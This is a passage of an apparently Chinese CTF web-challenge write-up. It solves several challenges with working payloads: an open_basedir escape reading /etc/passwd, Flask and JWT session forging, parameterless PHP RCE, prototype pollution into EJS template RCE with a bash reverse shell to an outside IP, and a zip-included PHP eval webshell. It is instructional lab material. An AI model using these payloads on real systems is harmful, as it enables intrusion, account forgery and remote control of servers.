<p>题目中把唯一的变量lover过滤了，给个文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45570082/article/details/107998748#t10">https://blog.csdn.net/qq_45570082/article/details/107998748#t10</a> 我们可以考虑大写的S编码绕过。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">S:encoded string</span><br><span class="line">可以将16进制编码成字符，可以进行绕过特定字符</span><br></pre></td></tr></table></figure>

<p>那么，了解到‘l’的16进制编码是‘6c’  把s:5:”lover”改成S:5:”\6cover”就能成功绕过。</p>
<p><strong>考点三：Open_basedir绕过</strong></p>
<p>打入payload发现system函数被禁用，看了看phpinfo发现命令执行函数都被ban了。</p>
<p>发现有open_basedir        &#x2F;var&#x2F;www&#x2F;html&#x2F;</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/LLeaves/p/13210005.html">https://www.cnblogs.com/LLeaves/p/13210005.html</a></p>
<p>可以利用glob伪协议来读取文件目录。glob伪协议在筛选目录时不受open_basedir制约。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">printf</span>(<span class="string">&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;&#x27;</span>, <span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;open_basedir&#x27;</span>));</span><br><span class="line"><span class="variable">$file_list</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="comment">// normal files</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// special files (starting with a dot(.))</span></span><br><span class="line"><span class="variable">$it</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///.*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$it</span> <span class="keyword">as</span> <span class="variable">$f</span>) &#123;</span><br><span class="line">    <span class="variable">$file_list</span>[] = <span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">sort</span>(<span class="variable">$file_list</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$file_list</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$f&#125;</span>&lt;br/&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现成的payload，去掉换行和回车，转义引号：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$lover</span> =<span class="string">&#x27;printf(\&#x27;&lt;b&gt;open_basedir : %s &lt;/b&gt;&lt;br /&gt;\&#x27;, ini_get(\&#x27;open_basedir\&#x27;));$file_list = array();$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) &#123;$file_list[] = $f-&gt;__toString();&#125;sort($file_list);foreach($file_list as $f)&#123;echo &quot;&#123;$f&#125;&lt;br/&gt;&quot;;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>读取到了根目录：</p>
<p><strong>open_basedir : &#x2F;var&#x2F;www&#x2F;html&#x2F;</strong> </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">f1ger</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br></pre></td></tr></table></figure>

<p>再利用ini_set读取文件内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;tmpdir&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;tmpdir&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/etc/passwd&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>现成的payload，去掉换行和回车，转义引号：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="variable">$lover</span>=<span class="string">&#x27;mkdir(\&#x27;tmpdir\&#x27;);chdir(\&#x27;tmpdir\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);chdir(\&#x27;..\&#x27;);ini_set(\&#x27;open_basedir\&#x27;,\&#x27;/\&#x27;);$a=file_get_contents(\&#x27;/f1ger\&#x27;);var_dump($a);&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>打入题目获得flag：SYC{0ihPuPsdvLrLH2Owsm}</p>
<h2 id="ez-path"><a href="#ez-path" class="headerlink" title="ez_path"></a>ez_path</h2><p>给了一个pyc文件，需要反编译为python文件才能看到源码。</p>
<p><a target="_blank" rel="noopener" href="https://www.toolkk.com/tools/pyc-decomplie">https://www.toolkk.com/tools/pyc-decomplie</a></p>
<p>一顿代码审计之后发现了os.path.join()函数，这个函数有个漏洞，如果传入的参数以&#x2F;开头，就会不管当前的路径，直接以你传入的&#x2F;开头的路径为返回值。</p>
<p>比如，我们文章名为abc，当前目录是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;</p>
<p>我们的文章路径就会是&#x2F;var&#x2F;www&#x2F;html&#x2F;article&#x2F;abc</p>
<p>而如果文章名是&#x2F;abc   我们的文章路径就是&#x2F;abc</p>
<p>发现网站源码里有flag名字：f14444</p>
<p>那么我们只需要文章名为&#x2F;f14444即可直接打开flag：</p>
<p>SYC{KfxR42aRRGkRrW8YN8}</p>
<h2 id="you-konw-flask"><a href="#you-konw-flask" class="headerlink" title="you konw flask?"></a>you konw flask?</h2><p>这把必当教练了奥！</p>
<p>注册登录题首先想到修改flask token登录，先注册一个帐号，拿到现在的session</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxIiwidXNlcl9pZCI6Mn0.ZWHBvQ.YSvcSY0-BnAI37sWrJyZAFaRUKk</span><br></pre></td></tr></table></figure>

<p>我们先要解密，才能修改数据，但是解密我们需要一个密钥。经过一顿找，发现在&#x2F;robots.txt里有东西&#x2F;3ysd8.html    打开后看源码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key是  app.secret_key = &#x27;wanbao&#x27;+base64.b64encode(str(random.randint(1, 100)).encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;)+&#x27;wanbao&#x27;</span><br></pre></td></tr></table></figure>

<p>拿到了源码，发现密钥是随机的，那我们需要遍历100个密钥，找到真正的密钥。</p>
<p>跑个脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    secret_key = <span class="string">&#x27;wanbao&#x27;</span> + base64.b64encode(<span class="built_in">str</span>(i).encode(<span class="string">&#x27;utf-8&#x27;</span>)).decode(<span class="string">&#x27;utf-8&#x27;</span>) + <span class="string">&#x27;wanbao&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(secret_key)</span><br></pre></td></tr></table></figure>

<p>然后出来了100个密钥，我们用github上的一个工具，flask-session-cookie-manager-master来测试每个密钥正不正确，100可以手测，但是脚本更快，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> $(<span class="built_in">cat</span> ~/Downloads/book.txt);<span class="keyword">do</span> <span class="built_in">echo</span> <span class="variable">$line</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\r\n&quot;</span>;python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py decode -s $(<span class="built_in">echo</span> <span class="variable">$line</span> | <span class="built_in">tr</span> -d <span class="string">&quot;\r\n&quot;</span>) -c <span class="string">&quot;eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxIiwidXNlcl9pZCI6Mn0.ZWHBvQ.YSvcSY0-BnAI37sWrJyZAFaRUKk&quot;</span>; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>这个脚本可以把book.txt里的100个密钥分别测试，如果能成功解密，就打印这个密钥。</p>
<p>经过测试，发现密钥为wanbaoOTg&#x3D;wanbao</p>
<p>而解密后的json数据是{‘is_admin’: False, ‘name’: ‘1’, ‘user_id’: 2}</p>
<p>显而易见，我们要把is_admin的值改为True，然后再通过密钥加密成session</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ~/web/flask-session-cookie-manager-master/flask_session_cookie_manager3.py encode -s <span class="string">&#x27;wanbaoOTg=wanbao&#x27;</span> -t <span class="string">&quot;&#123;&#x27;is_admin&#x27;: True, &#x27;name&#x27;: &#x27;1&#x27;, &#x27;user_id&#x27;: 2&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>替换原来的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJpc19hZG1pbiI6dHJ1ZSwibmFtZSI6IjEiLCJ1c2VyX2lkIjoyfQ.ZWHFLQ.CvOT4HS6-TxGX_tsrjgDUwkvYEA</span><br></pre></td></tr></table></figure>

<p>刷新页面，发现自己成为了教练力！进入学员管理，拿到flag</p>
<p>SYC{k49Ba0dwVuBxT7rqGQ}</p>
<h2 id="Pupyy-rce"><a href="#Pupyy-rce" class="headerlink" title="Pupyy_rce"></a>Pupyy_rce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$var</span>))</span><br></pre></td></tr></table></figure>

<p>经典无参数rce</p>
<p>提示在当前目录下有flag，这样可以直接使用随机读取当前目录文件payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>这是随机读文件，多试几次就能读到flag：</p>
<p>SYC{szmkLiIQ3ujD1BBWvV}</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pos(localeconv())是点</span><br><span class="line">scandir()扫描当前目录文件</span><br><span class="line">array_flip()将读取当前目录的键和值进行反转</span><br><span class="line">其中的键可以利用随机数函数array_rand()，进行随机生成</span><br><span class="line">然后利用readfile()函数，读取该文件</span><br></pre></td></tr></table></figure>





<h2 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h2><p>让我们看&#x2F;source，说我们不是admin，应该也是修改cookie登录，我们先找到cookie</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE3MDA5MDgyMjl9.N6H2hwmB3HWj1CX1xaNMgRWNcQZVK1x5Rj8adN4uWEo</span><br></pre></td></tr></table></figure>

<p>我们还是要先找到密钥，查看当前页面源码，发现&#x2F;hint，进去提示我们说密钥是出题人名字，VanZY</p>
<p><a target="_blank" rel="noopener" href="https://jwt.io/%E5%9C%A8%E8%BF%99%E4%B8%AA%E7%BD%91%E7%AB%99%E9%87%8C%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9cookie%E5%86%85%E5%AE%B9%EF%BC%8C%E6%8A%8Aguess%E6%8D%A2%E4%B8%BAadmin%EF%BC%8C%E5%86%8D%E6%89%93%E5%85%A5cookie%EF%BC%8C%E5%88%B7%E6%96%B0%EF%BC%8C%E7%9C%8B%E8%A7%81%E6%BA%90%E7%A0%81%E3%80%82">https://jwt.io/在这个网站里直接修改cookie内容，把guess换为admin，再打入cookie，刷新，看见源码。</a></p>
<p>审计源码发现：**res.render(‘index’, req.body);<strong>有两个命令执行点，第一个需要让</strong>Super[‘userrole’] &#x3D;&#x3D;&#x3D; ‘Superadmin’**第二个需要绕过过滤，过滤了所有能使用的函数，所以我们需要从第一个点进入，</p>
<p>var Super &#x3D; {};定义好了，而我们需要让super变成数组，并传入**”userrole”:”Superadmin”**</p>
<p>这道题考js原型链污染</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在/code路由里发现污染点</span><br><span class="line"><span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123; <span class="attr">deep</span>: <span class="literal">true</span> &#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;userrole&quot;</span><span class="punctuation">:</span><span class="string">&quot;Superadmin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br><span class="line">发现这样污染不行，换个payload</span><br></pre></td></tr></table></figure>

<p>每个构造函数(constructor)都有一个原型对象(prototype)</p>
<p>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></p>
<p>JavaScript使用prototype链实现继承机制</p>
<p>下面这条payload能成功污染原型链：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;userrole&quot;</span><span class="punctuation">:</span><span class="string">&quot;Superadmin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>再在&#x2F;create路由里进行<strong>Ejs模板引擎注入实现RCE</strong></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;view options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;xxx&#x27;);&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>拿到模板，将xxx的内容修改为反弹shell命令，完整payload：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;settings&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;view options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;escapeFunction&quot;</span><span class="punctuation">:</span> <span class="string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/47.108.89.135/2333 0&gt;&amp;1\&quot;&#x27;);&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;client&quot;</span><span class="punctuation">:</span> <span class="string">&quot;true&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>监听2333端口，打入payload，成功拿到shell</p>
<p> SYC{Chun_a1_M4n_NeVer_G1ve_Up}</p>
<h2 id="famale-imp-l0ve"><a href="#famale-imp-l0ve" class="headerlink" title="famale_imp_l0ve"></a>famale_imp_l0ve</h2><p>打开提示说“压缩”，试着上传一个zip文件，发现上传成功，第一反映是zip伪协议读文件，就找找有无文件包含的地方，查看源码，发现&#x2F;include.php进入发现是include文件包含。</p>
<p>上传的压缩包：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">名字是：123.zip</span><br><span class="line">内容是：123.jpg</span><br><span class="line">jpg内容是：&lt;?php @eval($_POST[&#x27;123&#x27;]);?&gt;</span><br></pre></td></tr></table></figure>

<p>在&#x2F;include.php传入</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=zip://upload/123.zip#123.jpg</span><br></pre></td></tr></table></figure>

<p>然后就可以任意命令执行了</p>
<p>SYC{bobegCk7ysmNOMI8z2}</p>
<h2 id="change-it"><a href="#change-it" class="headerlink" title="change_it"></a>change_it</h2><p>经典登录，发现源码里有帐号密码，登录之后发现有文件上传，但是告诉我们只有admin才能上传文件，我们复制cookie，但是需要找到密钥，一顿好找之后发现根本找不到，就去github上找到了一个密钥爆破脚本，下载下来后爆破密钥：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --<span class="built_in">rm</span>  jwtcrack eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4</span><br></pre></td></tr></table></figure>

<p>爆破出来密钥是：yibao</p>
<p>更换cookie后能上传文件，这道题可以直接上传php，但是我们的文件名被更换过一次，经过审计，发现是php伪随机数，随机数种子是当前时间截，我们只要掐好上传当时的时间截，把代码复制到本地跑一遍，就能拿到文件名了：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">php_mt_seed</span>(<span class="params"><span class="variable">$seed</span></span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="title function_ invoke__">mt_srand</span>(<span class="variable">$seed</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$seed</span> = <span class="number">1700298188</span>;</span><br><span class="line"> <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line"> <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&#x27;.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>文件名：TjjLzWMp9K.php</p>
<p>进入&#x2F;upload&#x2F;TjjLzWMp9K.php，成功命令执行。</p>
<p>SYC{fsfikgocwq4rsqmad5}</p>
<h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>发现有注册页面，随便注册一个，登录，看附件里的源码，发现&#x2F;flag网址，进去提示我们不是vip，审计源码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p>user这个类里isvip默认是false，而在注册界面，发现有merge(data,user)</p>
<p>存在原型链污染，根据python的结构，我们在注册时post的json数据应该是这样的：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;q&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;q&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;__class__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="attr">&quot;__base__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;isvip&quot;</span> <span class="punctuation">:</span><span class="string">&quot; True&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>但是显示被过滤了，经过测试，发现过滤了isvip，那么尝试unicode编码绕过：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;q&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;q&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;__class__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="attr">&quot;__base__&quot;</span> <span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;\u0069\u0073\u0076\u0069\u0070&quot;</span> <span class="punctuation">:</span><span class="string">&quot; True&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>注册成功！然后登录进去，进入&#x2F;flag界面，提示我们传入一个num：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br></pre></td></tr></table></figure>

<p>传入的num满足以上条件，即可拿到flag，尝试在123456789前后加各种字符，发现均不行，最后发现空格和tab能成功进入，于是传入num&#x3D;%20123456789或者num&#x3D;%09123456789均可。</p>
<p>SYC{WaefaxJoYLKnVyQQhO}</p>
<h2 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h2><p>绕过waf.php命令执行，经过测试，发现只能用异或payload，先看看phpinfo：</p>
